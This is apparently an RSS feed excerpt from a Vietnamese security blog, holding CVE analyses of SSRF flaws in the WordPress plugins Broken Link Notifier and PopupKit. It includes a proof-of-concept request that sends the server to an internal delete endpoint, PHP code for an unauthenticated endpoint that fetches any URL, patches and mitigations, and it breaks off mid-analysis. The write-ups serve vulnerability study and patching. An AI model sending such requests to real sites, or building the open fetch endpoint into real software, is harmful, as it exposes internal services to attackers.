localhost&#xA;...&#xA;&#xA;action=blnotifier_blinks&amp;amp;nonce=87f4d1ef16&amp;amp;source_url=http://localhost:8001/&amp;amp;header_links[0]=http://127.0.0.1:8001/delete?id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#34; title=&#34;G·ª≠i th√†nh c√¥ng request t·ªõi local service&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;G·ª≠i th√†nh c√¥ng request t·ªõi local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#39; alt=&#34;Result&#34; height=&#34;269&#34; width=&#34;966&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;G·ª≠i th√†nh c√¥ng request t·ªõi local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§1.3.0&lt;/strong&gt; c·ªßa Broken Link Notifier c√≥ l·ªó h·ªïng &lt;strong&gt;SSRF&lt;/strong&gt;: endpoint cho ph√©p anonymous truy·ªÅn URL, d·∫´n ƒë·∫øn &lt;code&gt;wp_remote_get()&lt;/code&gt; g·ªçi t·ªõi d·ªãch v·ª• n·ªôi b·ªô. B·∫£n &lt;strong&gt;1.3.1&lt;/strong&gt; ƒë√£ th√™m ki·ªÉm tra DNS/IP v√† gi·ªõi h·∫°n quy·ªÅn, ngƒÉn ch·∫∑n SSRF tr∆∞·ªõc khi th·ª±c hi·ªán request.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;N√¢ng c·∫•p ngay&lt;/strong&gt; l√™n &lt;strong&gt;‚â•1.3.1&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng tin URL t·ª´ client&lt;/strong&gt; ‚Äî validate/allowlist tr∆∞·ªõc khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ch·∫∑n IP n·ªôi b·ªô&lt;/strong&gt; (resolve DNS, block private/reserved).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·ªõi h·∫°n quy·ªÅn&lt;/strong&gt; endpoint (kh√¥ng cho anonymous).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tr·∫£ status thay v√¨ body th√¥&lt;/strong&gt; khi kh√¥ng c·∫ßn n·ªôi dung.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/broken-link-notifier/vulnerability/wordpress-broken-link-notifier-plugin-1-3-0-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Broken Link Notifier Plugin &amp;lt;= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10861 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-27-cve-2025-10861/</link>
      <pubDate>Mon, 27 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-27-cve-2025-10861/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;t·ª´ ƒë·∫ßu ƒë·∫øn 2.1.4 (bao g·ªìm c·∫£ 2.1.4)&lt;/strong&gt;.&#xA;Nguy√™n nh√¢n l√† do &lt;strong&gt;thi·∫øu ki·ªÉm tra h·ª£p l·ªá (insufficient validation)&lt;/strong&gt; ƒë·ªëi v·ªõi c√°c &lt;strong&gt;URL&lt;/strong&gt; ƒë∆∞·ª£c truy·ªÅn th√¥ng qua tham s·ªë &lt;strong&gt;&lt;code&gt;URL&lt;/code&gt;&lt;/strong&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c (unauthenticated attackers)&lt;/strong&gt; g·ª≠i c√°c &lt;strong&gt;web request&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;ƒë·ªãa ch·ªâ t√πy √Ω&lt;/strong&gt; xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web, c√≥ th·ªÉ ƒë∆∞·ª£c l·ª£i d·ª•ng ƒë·ªÉ &lt;strong&gt;truy v·∫•n ho·∫∑c ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services)&lt;/strong&gt;, c≈©ng nh∆∞ &lt;strong&gt;th·ª±c hi·ªán ho·∫°t ƒë·ªông trinh s√°t m·∫°ng (network reconnaissance)&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c &lt;strong&gt;v√° m·ªôt ph·∫ßn (partially patched)&lt;/strong&gt; trong &lt;strong&gt;phi√™n b·∫£n 2.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10861&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10861&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/popup-builder-block/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PopupKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;PopupKit&lt;/strong&gt;: &lt;strong&gt;2.1.3&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.1.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;V√¨ 1 ph·∫ßn m√£ ngu·ªìn ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n &lt;strong&gt;2.1.4&lt;/strong&gt; n√™n ta s·∫Ω s·ª≠ d·ª•ng phi√™n b·∫£n &lt;strong&gt;2.1.3&lt;/strong&gt; ƒë·ªÉ ph√¢n t√≠ch.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;2.1.3&lt;/strong&gt;, plugin ƒë·ªãnh nghƒ©a m·ªôt API v·ªõi POST method c√≥ &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;, cho ph√©p &lt;strong&gt;m·ªçi ng∆∞·ªùi d√πng&lt;/strong&gt;, bao g·ªìm c·∫£ &lt;strong&gt;anonymous user&lt;/strong&gt;, th·ª±c thi h√†m &lt;code&gt;fetch_external_content()&lt;/code&gt; v·ªõi tham s·ªë &lt;code&gt;url&lt;/code&gt; b·∫Øt bu·ªôc.&lt;br&gt;&#xA;H√†m n√†y s·ª≠ d·ª•ng &lt;code&gt;wp_remote_get&lt;/code&gt; ƒë·ªÉ g·ª≠i request ƒë·∫øn URL ƒë∆∞·ª£c truy·ªÅn v√†o v√† tr·∫£ l·∫°i n·ªôi dung ph·∫£n h·ªìi (response body).&lt;/p&gt;&#xA;&lt;p&gt;Do kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c l·ªçc URL n·ªôi b·ªô n√†o, ƒëi·ªÅu n√†y khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i request ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services) d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; c√≥ th·ªÉ khai th√°c b·ªüi &lt;strong&gt;anonymous user&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview-template&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_safe_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong b·∫£n v√° &lt;strong&gt;2.1.5&lt;/strong&gt;, plugin ƒë√£ th·ª±c hi·ªán m·ªôt s·ªë thay ƒë·ªïi nh·∫±m gi·∫£m thi·ªÉu nguy c∆° &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;ƒê·ªïi endpoint&lt;/strong&gt; t·ª´ &lt;code&gt;/live-preview&lt;/code&gt; sang &lt;code&gt;/live-preview-template&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thay th·∫ø h√†m &lt;code&gt;wp_remote_get()&lt;/code&gt; b·∫±ng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, gi√∫p WordPress &lt;strong&gt;t·ª± ƒë·ªông ch·∫∑n c√°c request ƒë·∫øn ƒë·ªãa ch·ªâ n·ªôi b·ªô&lt;/strong&gt; nh∆∞ &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1&lt;/code&gt;, ho·∫∑c &lt;code&gt;169.254.*&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nh·ªù v·∫≠y, c√°c y√™u c·∫ßu t·ª´ ng∆∞·ªùi d√πng ƒë·∫øn t√†i nguy√™n n·ªôi b·ªô c·ªßa m√°y ch·ªß s·∫Ω b·ªã ch·∫∑n, ngƒÉn ch·∫∑n kh·∫£ nƒÉng khai th√°c SSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;get_routes()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi b√™n trong &lt;code&gt;register_routes()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;pbb/v1&amp;#39;;&#xA;&#xA;public function register_routes() {&#xA;    $routes = $this-&amp;gt;get_routes();&#xA;    foreach ($routes as $route) {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace,&#xA;            $route[&amp;#39;endpoint&amp;#39;],&#xA;            [&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route[&amp;#39;methods&amp;#39;],&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; [$this, $route[&amp;#39;callback&amp;#39;]],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; isset($route[&amp;#39;permission_callback&amp;#39;])&#xA;                    ? $route[&amp;#39;permission_callback&amp;#39;]&#xA;                    : [$this, &amp;#39;permission_callback&amp;#39;],&#xA;            ]&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;public function permission_callback(): bool {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;register_routes()&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi, t·∫•t c·∫£ c√°c route ƒë∆∞·ª£c tr·∫£ v·ªÅ t·ª´ &lt;code&gt;get_routes()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c ƒëƒÉng k√Ω v√†o WordPress REST API th√¥ng qua h√†m &lt;code&gt;register_rest_route()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªói route s·∫Ω √°nh x·∫° t·ªõi m·ªôt &lt;code&gt;endpoint&lt;/code&gt;, &lt;code&gt;method&lt;/code&gt; v√† &lt;code&gt;callback&lt;/code&gt; t∆∞∆°ng ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu route kh√¥ng c√≥ kh√≥a &lt;code&gt;permission_callback&lt;/code&gt;, plugin s·∫Ω t·ª± ƒë·ªông g√°n m·∫∑c ƒë·ªãnh l√† &lt;code&gt;$this-&amp;gt;permission_callback&lt;/code&gt;, y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i c√≥ quy·ªÅn &lt;strong&gt;manage_options&lt;/strong&gt; (th∆∞·ªùng ch·ªâ c√≥ admin).&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhi√™n, trong phi√™n b·∫£n &lt;strong&gt;2.1.3&lt;/strong&gt;, route &lt;code&gt;/live-preview&lt;/code&gt; l·∫°i ƒë∆∞·ª£c khai b√°o th·ªß 